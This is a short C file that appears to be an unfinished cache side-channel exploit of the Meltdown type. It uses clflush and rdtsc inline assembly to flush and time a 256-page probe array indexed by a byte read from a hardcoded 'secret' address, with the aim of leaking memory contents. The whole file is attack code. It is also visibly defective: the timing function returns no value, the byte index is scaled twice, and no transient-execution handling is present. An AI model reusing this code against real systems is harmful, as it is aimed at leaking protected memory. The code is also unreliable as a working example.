#include <stdio.h>
#include <stdint.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <time.h>
#include <string.h>
#include <stdlib.h>

void flush(const uint8_t* addr){
	asm __volatile__("mfence\n\tclflush 0(%0)" : : "r"(addr) :);
}

void flushMem(const uint8_t* base_addr, int size_in_bytes){
	for(int i =0; i<size_in_bytes; i++)
		flush(base_addr+i);
}

uint32_t measure_one_block_access_time(uint64_t addr)
{
	uint32_t cycles;
	asm volatile("mov %1, %%r8\n\t"
			"lfence\n\t"
			"rdtsc\n\t"
			"mov %%eax, %%edi\n\t"
			"mov (%%r8), %%r8\n\t"
			"lfence\n\t"
			"rdtsc\n\t"
			"sub %%edi, %%eax\n\t"
			: "=a"(cycles)
			: "r"(addr)
			: "r8", "edi");
}

int main(){
	char oracle[256*4096];
	char* secret = (char*)0x7fffffffe0a0;
	uint8_t extract = 0x41;
	uint32_t best_cycles = 1000;

	while(1)
	{
		asm volatile("movq %1, %%r10\n\t"
				"movb (%%r10), %0\n\t"
				: "=r"(extract)
				: "r"(secret)
				: "%r10"
			    );
		extract = extract << 12;
		//flush buffer
		for(uint32_t i =0; i<256; i++)
			flush(&oracle[i*4096]);
		oracle[extract*4096];
		for(uint32_t i =0; i<256; i++)
		{
			uint32_t temp_cycles;
			temp_cycles = measure_one_block_access_time((uint64_t)&oracle[i*4096]);
			if(temp_cycles < best_cycles){
				best_cycles = temp_cycles;
				//printf("Potential byte %c found at addr %lx\n", i, secret);
			}
			
		}
	}
	return 0;
}
